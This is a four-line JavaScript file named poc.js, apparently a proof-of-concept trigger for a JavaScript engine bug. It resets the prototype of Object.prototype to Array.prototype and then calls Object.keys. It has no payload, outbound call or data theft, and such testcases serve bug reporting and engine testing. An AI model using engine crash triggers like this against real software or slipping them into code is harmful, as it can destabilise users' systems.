// poc.js
var a = { } ;
Object. setPrototypeOf ( Object. getPrototypeOf ( a ), Array. prototype ) ;
Object. keys ( a ) ;
